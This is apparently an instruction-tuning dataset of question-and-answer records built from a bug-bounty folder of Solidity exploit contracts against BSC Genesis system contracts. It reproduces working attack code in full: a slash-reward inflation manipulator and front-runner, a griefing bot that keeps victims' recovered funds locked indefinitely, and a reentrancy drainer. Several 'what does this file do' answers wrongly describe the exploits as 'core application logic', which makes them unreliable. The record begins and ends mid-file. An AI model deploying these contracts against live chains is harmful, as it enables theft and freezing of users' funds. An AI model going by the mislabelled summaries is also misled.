\"Donation failed\");\n\n        // Step 2: Submit evidence (would need real double-sign evidence)\n        try ISlashIndicator(SLASH_INDICATOR_ADDR).submitDoubleSignEvidence(header1, header2) {\n            uint256 balanceAfter = address(this).balance;\n            uint256 reward = balanceAfter - balanceBefore + donationAmount;\n            emit ExploitAttempted(true, reward);\n        } catch {\n            emit ExploitAttempted(false, 0);\n        }\n    }\n\n    receive() external payable {}\n}\n\n/**\n * @title SlashFrontRunner\n * @dev Front-runs slash transactions to manipulate rewards\n */\ncontract SlashFrontRunner {\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n\n    event FrontRunDetected(bytes32 txHash, address slasher);\n    event FrontRunExecuted(uint256 donationAmount);\n\n    /**\n     * @dev Called when a slash transaction is detected in mempool\n     * In practice, this would be triggered by a mempool monitoring bot\n     */\n    function frontRunSlash(uint256 donationAmount) external payable {\n        require(msg.value >= donationAmount, \"Insufficient funds\");\n\n        // Donate to inflate balance before the slash tx executes\n        (bool sent,) = SYSTEM_REWARD_ADDR.call{value: donationAmount}(\"\");\n        require(sent, \"Donation failed\");\n\n        emit FrontRunExecuted(donationAmount);\n    }\n\n    receive() external payable {}\n}\n\n```"}
{"instruction": "What does the file SlashRewardManipulation.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Slash Reward Inflation Attack                                â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - SlashIndicator                         â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $10,000 - $25,000                                   â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * In SlashIndicator.sol line 260:\n *   uint256 amount = (address(SYSTEM_REWARD_ADDR).balance * felonySlashRewardRatio) / 100;\n *\n * The reward is calculated as a percentage of SYSTEM_REWARD_ADDR balance.\n * An attacker can:\n * 1. Send large amount of BNB to SYSTEM_REWARD_ADDR\n * 2. Submit valid finality violation evidence\n * 3. Receive inflated reward (20% of the inflated balance)\n * 4. Profit = 20% of donated amount\n *\n * WHY IT'S DANGEROUS:\n * - Drains system reward pool\n * - Creates economic incentive for fake slashing\n * - Could be combined with validator collusion\n */\n\ninterface ISlashIndicator {\n    struct VoteData {\n        uint256 srcNum;\n        bytes32 srcHash;\n        uint256 tarNum;\n        bytes32 tarHash;\n        bytes sig;\n    }\n\n    struct FinalityEvidence {\n        VoteData voteA;\n        VoteData voteB;\n        bytes voteAddr;\n    }\n\n    function submitFinalityViolationEvidence(FinalityEvidence memory evidence) external;\n    function submitDoubleSignEvidence(bytes memory header1, bytes memory header2) external;\n}\n\ninterface ISystemReward {\n    function claimRewards(address to, uint256 amount) external returns (uint256);\n}\n\n/**\n * @title SlashRewardManipulator\n * @dev Exploits the slash reward calculation vulnerability\n */\ncontract SlashRewardManipulator {\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n    address public constant SLASH_INDICATOR_ADDR = 0x000000000000000000000000000000000\n```", "output": "This file `SlashRewardManipulation.sol` is part of the exploits project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for TokenRecoveryTimingAttack.sol which is part of the exploits project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\exploits\\TokenRecoveryTimingAttack.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Token Recovery Lock Extension Attack                         â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - TokenHub + TokenRecoverPortal          â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $5,000 - $15,000                                    â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * In TokenHub.sol lines 230-236:\n *   function _lockRecoverToken(...) internal {\n *       lockInfo.amount = lockInfo.amount.add(amount);\n *       lockInfo.unlockAt = block.timestamp + LOCK_PERIOD_FOR_TOKEN_RECOVER;\n *   }\n *\n * Each recovery request RESETS the unlockAt timestamp!\n * An attacker can:\n * 1. Wait for victim to initiate token recovery\n * 2. Before 7 days pass, initiate another tiny recovery for same victim\n * 3. This resets the 7-day timer\n * 4. Repeat indefinitely to lock victim's funds forever\n *\n * WHY IT'S DANGEROUS:\n * - Permanent DoS on token recovery\n * - Victims cannot access their migrated funds\n * - Griefing attack with minimal cost to attacker\n */\n\ninterface ITokenHub {\n    function lockInfoMap(address token, address recipient) external view returns (uint256 amount, uint256 unlockAt);\n    function withdrawUnlockedToken(address tokenAddress, address recipient) external;\n}\n\ninterface ITokenRecoverPortal {\n    function recover(\n        bytes32 tokenSymbol,\n        uint256 amount,\n        bytes calldata ownerPubKey,\n        bytes calldata ownerSignature,\n        bytes calldata approvalSignature,\n        bytes32[] calldata merkleProof\n    ) external;\n\n    function isRecovered(bytes32 node) external view returns (bool);\n}\n\n/**\n * @title TokenRecoveryTimingAnalyzer\n * @dev Analyzes the timing attack vulnerability\n */\ncontract TokenRecoveryTimingAnalyzer {\n    address public constant TOKEN_HUB = 0x0000000000000000000000000000000000001004;\n    uint256 public constant LOCK_PERIOD = 7 days;\n\n    event LockAnalysis(\n        address indexed victim,\n        uint256 lockedAmount,\n        uint256 unlockAt,\n        uint256 timeRemaining,\n        bool canBeExtended\n    );\n\n    event AttackSimulation(\n        address indexed victim,\n        uint256 originalUnlock,\n        uint256 newUnlock,\n        uint256 extensionGained\n    );\n\n    /**\n     * @dev Analyze a victim's lock status\n     * @param victim Address to analyze\n     * @param tokenAddress Token contract (address(0) for BNB)\n     */\n    function analyzeLock(\n        address victim,\n        address tokenAddress\n    ) external view returns (\n        uint256 lockedAmount,\n        uint256 unlockAt,\n        uint256 timeRemaining,\n        bool isLocked,\n        bool canBeExtended\n    ) {\n        (lockedAmount, unlockAt) = ITokenHub(TOKEN_HUB).lockInfoMap(tokenAddress, victim);\n\n        isLocked = lockedAmount > 0;\n\n        if (block.timestamp >= unlockAt) {\n            timeRemaining = 0;\n            canBeExtended = false;\n        } else {\n            timeRemaining = unlockAt - block.timestamp;\n            // Can be extended if there's active lock that hasn't expired\n            canBeExtended = isLocked && timeRemaining > 0;\n        }\n    }\n\n    /**\n     * @dev Calculate the cost-benefit of the griefing attack\n     * @param attackDuration How long attacker wants to lock victim's funds (in days)\n     * @param recoveryTxCost Estimated cost per recovery transaction (in wei)\n     */\n    function calculateAttackCost(\n        uint256 attackDuration,\n        uint256 recoveryTxCost\n    ) external pure returns (\n        uint256 numTransactionsNeeded,\n        uint256 totalCost,\n        uint256 averageInterval\n    ) {\n        // Each transaction extends lock by 7 days\n        // To maintain lock for attackDuration, need to send tx every 7 days\n        numTransactionsNeeded = (attackDuration / 7) + 1;\n        totalCost = numTransactionsNeeded * recoveryTxCost;\n        averageInterval = 7 days;\n    }\n}\n\n/**\n * @title TokenRecoveryGriefingBot\n * @dev Automated bot that extends victim's lock period\n *\n * NOTE: This requires valid merkle proofs and signatures.\n * In practice, attacker would need to:\n * 1. Own BC tokens in merkle tree\n * 2. Use their own tokens to grief others\n * 3. Or find way to craft fake proofs (would be critical vuln)\n */\ncontract TokenRecoveryGriefingBot {\n    address public constant TOKEN_HUB = 0x0000000000000000000000000000000000001004;\n    address public constant TOKEN_RECOVER_PORTAL = 0x0000000000000000000000000000000000003000;\n\n    address public owner;\n    address public targetVictim;\n    uint256 public lastExtensionTime;\n\n    event GriefingScheduled(address victim, uint256 nextExtensionTime);\n    event LockExtended(address victim, uint256 newUnlockTime);\n    event GriefingStopped(address victim, uint256 totalDuration);\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not owner\");\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    /**\n     * @dev Start griefing a victim\n     * @param victim The address to grief\n     */\n    function startGriefing(address victim) external onlyOwner {\n        targetVictim = victim;\n        lastExtensionTime = block.timestamp;\n        emit GriefingScheduled(victim, block.timestamp + 6 days);\n    }\n\n    /**\n     * @dev Check if it's time to extend the lock\n     */\n    function shouldExtend() external view returns (bool) {\n        if (targetVictim == address(0)) return false;\n\n        // Extend 1 day before current lock expires\n        // This ensures continuous locking\n        (uint256 amount, uint256 unlockAt) = ITokenHub(TOKEN_HUB).lockInfoMap(\n            address(0), // BNB\n            targetVictim\n        );\n\n        if (amount == 0) return false;\n\n        // Extend if less than 1 day remaining\n        return block.timestamp + 1 days >= unlockAt;\n    }\n\n    /**\n     * @dev Extend the victim's lock (requires valid recovery params)\n     *\n     * IMPORTANT: This function would need valid merkle proof and signatures\n     * The vulnerability exists because TokenHub doesn't verify the recipient\n     * is the same as the signature owner - but TokenRecoverPortal does verify.\n     *\n     * So the REAL attack vector would be:\n     * 1. Attacker legitimately recovers their own tiny amount\n     * 2. But specifies victim's address as recipient somehow\n     * 3. This extends victim's lock\n     *\n     * Need to verify if this is possible...\n     */\n    function extendLock(\n        bytes32 tokenSymbol,\n        uint256 amount,\n        bytes calldata ownerPubKey,\n        bytes calldata ownerSignature,\n        bytes calldata approvalSignature,\n        bytes32[] calldata merkleProof\n    ) external onlyOwner {\n        // Note: The actual vulnerability might be more nuanced\n        // Need to check if attacker can specify different recipient\n\n        ITokenRecoverPortal(TOKEN_RECOVER_PORTAL).recover(\n            tokenSymbol,\n            amount,\n            ownerPubKey,\n            ownerSignature,\n            approvalSignature,\n            merkleProof\n        );\n\n        lastExtensionTime = block.timestamp;\n        emit LockExtended(targetVictim, block.timestamp + 7 days);\n    }\n\n    /**\n     * @dev Stop the griefing attack\n     */\n    function stopGriefing() external onlyOwner {\n        uint256 duration = block.timestamp - lastExtensionTime;\n        emit GriefingStopped(targetVictim, duration);\n        targetVictim = address(0);\n    }\n}\n\n/**\n * @title SelfGriefingDemo\n * @dev Demonstrates the vulnerability using attacker's own funds\n *\n * This shows that ANY recovery resets the timer, even the victim's own.\n * So if victim does multiple small recoveries, they extend their own lock.\n */\ncontract SelfGriefingDemo {\n    address public constant TOKEN_HUB = 0x0000000000000000000000000000000000001004;\n\n    event DemoResult(\n        uint256 firstRecoveryTime,\n        uint256 firstUnlock,\n        uint256 secondRecoveryTime,\n        uint256 secondUnlock,\n        uint256 extensionGained\n    );\n\n    /**\n     * @dev Demonstrates that multiple recoveries extend lock\n     *\n     * Scenario:\n     * - User recovers 100 BNB at T=0, unlocks at T+7 days\n     * - User recovers 1 BNB at T+6 days, unlocks at T+13 days\n     * - User has to wait 13 days total instead of 7 days\n     */\n    function demonstrateVulnerability() external view returns (string memory explanation) {\n        return \"The vulnerability allows lock extension through multiple recoveries. \"\n               \"Each recovery resets unlockAt to current_time + 7_days, \"\n               \"regardless of how much time was remaining on the previous lock. \"\n               \"This could be exploited by: \"\n               \"1) An attacker with tiny BC balances targeting victims \"\n               \"2) Accidental self-griefing by users doing multiple recoveries \"\n               \"3) Malicious actors who gain access to victim's BC credentials\";\n    }\n}\n\n```"}
{"instruction": "What does the file TokenRecoveryTimingAttack.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Token Recovery Lock Extension Attack                         â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - TokenHub + TokenRecoverPortal          â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $5,000 - $15,000                                    â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * In TokenHub.sol lines 230-236:\n *   function _lockRecoverToken(...) internal {\n *       lockInfo.amount = lockInfo.amount.add(amount);\n *       lockInfo.unlockAt = block.timestamp + LOCK_PERIOD_FOR_TOKEN_RECOVER;\n *   }\n *\n * Each recovery request RESETS the unlockAt timestamp!\n * An attacker can:\n * 1. Wait for victim to initiate token recovery\n * 2. Before 7 days pass, initiate another tiny recovery for same victim\n * 3. This resets the 7-day timer\n * 4. Repeat indefinitely to lock victim's funds forever\n *\n * WHY IT'S DANGEROUS:\n * - Permanent DoS on token recovery\n * - Victims cannot access their migrated funds\n * - Griefing attack with minimal cost to attacker\n */\n\ninterface ITokenHub {\n    function lockInfoMap(address token, address recipient) external view returns (uint256 amount, uint256 unlockAt);\n    function withdrawUnlockedToken(address tokenAddress, address recipient) external;\n}\n\ninterface ITokenRecoverPortal {\n    function recover(\n        bytes32 tokenSymbol,\n        uint256 amount,\n        bytes calldata ownerPubKey,\n        bytes calldata ownerSignature,\n        bytes calldata approvalSignature,\n        bytes32[] calldata merkleProof\n    ) external;\n\n    function isRecovered(bytes32 node) external view returns (bool);\n}\n\n/**\n * @title TokenRecoveryTimingAnalyzer\n * @dev Analyzes the timing attack vulnerability\n */\ncontract TokenRecoveryTimingAnalyzer {\n    address public constant TOKEN_HUB = 0x000000000000000000000000000000000000\n```", "output": "This file `TokenRecoveryTimingAttack.sol` is part of the exploits project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for UncheckedReturnExploit.sol which is part of the exploits project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\exploits\\UncheckedReturnExploit.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Unchecked Return Value - Fund Trapping                       â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - StakeHub.distributeReward()            â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $10,000 - $50,000                                   â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * In StakeHub.sol line 656:\n *   SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n *\n * The return value is NOT checked. If this call fails:\n * - Funds remain trapped in StakeHub\n * - No error is thrown\n * - Event says \"INVALID_VALIDATOR\" but funds are lost\n *\n * This can happen if:\n * 1. SYSTEM_REWARD_ADDR is a contract that reverts\n * 2. SYSTEM_REWARD_ADDR runs out of gas\n * 3. SYSTEM_REWARD_ADDR has receive() that reverts under certain conditions\n *\n * WHY IT'S DANGEROUS:\n * - Staking rewards can be permanently lost\n * - Validators lose income\n * - Economic damage to network participants\n */\n\ninterface IStakeHub {\n    function distributeReward(address consensusAddress) external payable;\n}\n\ninterface ISystemReward {\n    function claimRewards(address to, uint256 amount) external returns (uint256);\n}\n\n/**\n * @title UncheckedReturnAnalyzer\n * @dev Analyzes the unchecked return value vulnerability\n */\ncontract UncheckedReturnAnalyzer {\n    address public constant STAKE_HUB = 0x0000000000000000000000000000000000002002;\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n\n    event AnalysisResult(\n        bool systemRewardAcceptsFunds,\n        uint256 systemRewardBalance,\n        uint256 stakeHubBalance,\n        bool potentialFundTrap\n    );\n\n    event SimulationResult(\n        bool callSucceeded,\n        uint256 amountSent,\n        uint256 systemRewardBalanceBefore,\n        uint256 systemRewardBalanceAfter\n    );\n\n    /**\n     * @dev Analyze current state and potential for fund trapping\n     */\n    function analyzeVulnerability() external view returns (\n        uint256 systemRewardBalance,\n        uint256 stakeHubBalance,\n        string memory riskAssessment\n    ) {\n        systemRewardBalance = SYSTEM_REWARD_ADDR.balance;\n        stakeHubBalance = STAKE_HUB.balance;\n\n        // The risk is that distributeReward sends to SYSTEM_REWARD_ADDR\n        // without checking success\n        riskAssessment = \"MEDIUM: If SYSTEM_REWARD receive() fails, funds are trapped in StakeHub. \"\n                        \"This could happen during network congestion or if SYSTEM_REWARD \"\n                        \"contract is upgraded to a version with failing receive().\";\n    }\n\n    /**\n     * @dev Simulate what happens when the call fails\n     */\n    function simulateFailure() external payable returns (string memory result) {\n        // In practice, we can't make SYSTEM_REWARD_ADDR fail\n        // But we can demonstrate the pattern\n\n        // The vulnerable code pattern is:\n        // SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n        //\n        // Should be:\n        // (bool success,) = SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n        // require(success, \"Transfer failed\");\n\n        return \"The vulnerability is that if the call fails, the function continues \"\n               \"as if nothing happened. Funds stay in StakeHub but are not tracked. \"\n               \"They become 'ghost funds' that no one can claim.\";\n    }\n\n    /**\n     * @dev Calculate potential fund loss from this vulnerability\n     * @param blocksPerDay Average blocks per day\n     * @param avgRewardPerBlock Average reward per block\n     * @param failureRate Estimated failure rate (1 = 0.01%)\n     */\n    function calculatePotentialLoss(\n        uint256 blocksPerDay,\n        uint256 avgRewardPerBlock,\n        uint256 failureRate\n    ) external pure returns (\n        uint256 dailyLoss,\n        uint256 monthlyLoss,\n        uint256 yearlyLoss\n    ) {\n        uint256 dailyRewards = blocksPerDay * avgRewardPerBlock;\n        dailyLoss = (dailyRewards * failureRate) / 10000;\n        monthlyLoss = dailyLoss * 30;\n        yearlyLoss = dailyLoss * 365;\n    }\n}\n\n/**\n * @title ReceiveFailer\n * @dev Contract that fails to receive funds under certain conditions\n * Used to demonstrate how the vulnerability could be exploited\n */\ncontract ReceiveFailer {\n    bool public shouldFail;\n    uint256 public receivedAmount;\n\n    event ReceiveCalled(uint256 amount, bool failed);\n\n    function setShouldFail(bool _shouldFail) external {\n        shouldFail = _shouldFail;\n    }\n\n    receive() external payable {\n        if (shouldFail) {\n            emit ReceiveCalled(msg.value, true);\n            revert(\"Intentional failure\");\n        }\n        receivedAmount += msg.value;\n        emit ReceiveCalled(msg.value, false);\n    }\n}\n\n/**\n * @title VulnerablePattern\n * @dev Demonstrates the vulnerable vs safe pattern\n */\ncontract VulnerablePattern {\n    event TransferAttempted(bool success, uint256 amount);\n\n    /**\n     * @dev VULNERABLE: This is how StakeHub currently does it\n     */\n    function vulnerableTransfer(address target) external payable {\n        // This line doesn't check success - funds can be lost!\n        target.call{ value: msg.value }(\"\");\n        // Execution continues even if the transfer failed\n    }\n\n    /**\n     * @dev SAFE: This is how it should be done\n     */\n    function safeTransfer(address target) external payable {\n        (bool success,) = target.call{ value: msg.value }(\"\");\n        require(success, \"Transfer failed\");\n        emit TransferAttempted(success, msg.value);\n    }\n\n    /**\n     * @dev SAFEST: Use low-level call with explicit handling\n     */\n    function safestTransfer(address target) external payable {\n        (bool success, bytes memory data) = target.call{ value: msg.value }(\"\");\n        if (!success) {\n            // Refund the sender\n            (bool refundSuccess,) = msg.sender.call{ value: msg.value }(\"\");\n            require(refundSuccess, \"Refund failed\");\n            emit TransferAttempted(false, msg.value);\n        } else {\n            emit TransferAttempted(true, msg.value);\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file UncheckedReturnExploit.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Unchecked Return Value - Fund Trapping                       â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - StakeHub.distributeReward()            â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $10,000 - $50,000                                   â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * In StakeHub.sol line 656:\n *   SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n *\n * The return value is NOT checked. If this call fails:\n * - Funds remain trapped in StakeHub\n * - No error is thrown\n * - Event says \"INVALID_VALIDATOR\" but funds are lost\n *\n * This can happen if:\n * 1. SYSTEM_REWARD_ADDR is a contract that reverts\n * 2. SYSTEM_REWARD_ADDR runs out of gas\n * 3. SYSTEM_REWARD_ADDR has receive() that reverts under certain conditions\n *\n * WHY IT'S DANGEROUS:\n * - Staking rewards can be permanently lost\n * - Validators lose income\n * - Economic damage to network participants\n */\n\ninterface IStakeHub {\n    function distributeReward(address consensusAddress) external payable;\n}\n\ninterface ISystemReward {\n    function claimRewards(address to, uint256 amount) external returns (uint256);\n}\n\n/**\n * @title UncheckedReturnAnalyzer\n * @dev Analyzes the unchecked return value vulnerability\n */\ncontract UncheckedReturnAnalyzer {\n    address public constant STAKE_HUB = 0x0000000000000000000000000000000000002002;\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n\n    event AnalysisResult(\n        bool systemRewardAcceptsFunds,\n        uint256 systemRewardBalance,\n        uint256 stakeHubBalance,\n        bool potentialFundTrap\n    );\n\n    event SimulationResult(\n        bool callSucceeded,\n        uint256 amountSent,\n        uint256 systemRewardBalanceBefore,\n        uint256 systemRewardBalanceAfter\n    )\n```", "output": "This file `UncheckedReturnExploit.sol` is part of the exploits project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ReentrancyExploit.sol which is part of the 01_StakeHub_Reentrancy project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\submissions\\01_StakeHub_Reentrancy\\ReentrancyExploit.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Reentrancy Attack on StakeHub.redelegate()                   â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - StakeHub                               â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $50,000 - $100,000                                  â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * The redelegate() function makes external calls before completing state changes:\n * 1. unbond() - returns BNB to StakeHub\n * 2. call{value: feeCharge}(\"\") - sends fee to destination creditContract\n * 3. delegate() - delegates to new validator\n *\n * If a malicious creditContract is used as destination, it can reenter\n * during step 2 when receiving the fee.\n *\n * WHY IT'S DANGEROUS:\n * - Could drain staking rewards\n * - Manipulate share calculations\n * - Disrupt validator economics\n */\n\ninterface IStakeHub {\n    function redelegate(\n        address srcValidator,\n        address dstValidator,\n        uint256 shares,\n        bool delegateVotePower\n    ) external;\n\n    function delegate(address operatorAddress, bool delegateVotePower) external payable;\n    function undelegate(address operatorAddress, uint256 shares) external;\n}\n\ninterface IStakeCredit {\n    function delegate(address delegator) external payable returns (uint256);\n    function unbond(address delegator, uint256 shares) external returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n}\n\n/**\n * @title MaliciousCreditContract\n * @dev Simulates a malicious StakeCredit contract that attempts reentrancy\n */\ncontract MaliciousCreditContract {\n    IStakeHub public stakeHub;\n    address public targetValidator;\n    uint256 public attackCount;\n    uint256 public maxAttacks;\n    bool public attacking;\n\n    event ReentrancyAttempt(uint256 count, uint256 value);\n    event AttackResult(bool success, string reason);\n\n    constructor(address _stakeHub) {\n        stakeHub = IStakeHub(_stakeHub);\n        maxAttacks = 3;\n    }\n\n    // This receive function is called when StakeHub sends the redelegate fee\n    receive() external payable {\n        emit ReentrancyAttempt(attackCount, msg.value);\n\n        if (attacking && attackCount < maxAttacks) {\n            attackCount++;\n\n            // Attempt to reenter redelegate\n            // This would allow draining more funds than entitled\n            try stakeHub.redelegate(\n                targetValidator,\n                address(this),\n                1 ether,\n                false\n            ) {\n                emit AttackResult(true, \"Reentrancy successful!\");\n            } catch Error(string memory reason) {\n                emit AttackResult(false, reason);\n            }\n        }\n    }\n\n    function startAttack(address _targetValidator) external payable {\n        targetValidator = _targetValidator;\n        attacking = true;\n        attackCount = 0;\n\n        // Initial delegation to get shares\n        stakeHub.delegate{value: msg.value}(targetValidator, false);\n    }\n\n    function executeRedelegate(uint256 shares) external {\n        // This triggers the reentrancy via receive()\n        stakeHub.redelegate(\n            targetValidator,\n            address(this), // destination is this malicious contract\n            shares,\n            false\n        );\n    }\n\n    function stopAttack() external {\n        attacking = false;\n    }\n\n    // Required interface functions for StakeCredit compatibility\n    function delegate(address) external payable returns (uint256) {\n        return msg.value;\n    }\n\n    function unbond(address, uint256 shares) external returns (uint256) {\n        return shares;\n    }\n\n    function balanceOf(address) external pure returns (uint256) {\n        return 1000 ether;\n    }\n}\n\n/**\n * @title ReentrancyExploitTest\n * @dev Test harness for the reentrancy exploit\n */\ncontract ReentrancyExploitTest {\n    MaliciousCreditContract public maliciousContract;\n    address public stakeHubAddress;\n\n    event ExploitStarted(address maliciousContract);\n    event ExploitCompleted(uint256 drainedAmount);\n\n    constructor(address _stakeHub) {\n        stakeHubAddress = _stakeHub;\n        maliciousContract = new MaliciousCreditContract(_stakeHub);\n    }\n\n    function runExploit(address targetValidator) external payable {\n        emit ExploitStarted(address(maliciousContract));\n\n        // Step 1: Fund the malicious contract\n        maliciousContract.startAttack{value: msg.value}(targetValidator);\n\n        // Step 2: Execute redelegate which triggers reentrancy\n        // The malicious contract's receive() will attempt to reenter\n        maliciousContract.executeRedelegate(msg.value / 2);\n\n        emit ExploitCompleted(address(maliciousContract).balance);\n    }\n\n    receive() external payable {}\n}\n\n```"}
{"instruction": "What does the file ReentrancyExploit.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Reentrancy Attack on StakeHub.redelegate()                   â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - StakeHub                               â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $50,000 - $100,000                                  â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * The redelegate() function makes external calls before completing state changes:\n * 1. unbond() - returns BNB to StakeHub\n * 2. call{value: feeCharge}(\"\") - sends fee to destination creditContract\n * 3. delegate() - delegates to new validator\n *\n * If a malicious creditContract is used as destination, it can reenter\n * during step 2 when receiving the fee.\n *\n * WHY IT'S DANGEROUS:\n * - Could drain staking rewards\n * - Manipulate share calculations\n * - Disrupt validator economics\n */\n\ninterface IStakeHub {\n    function 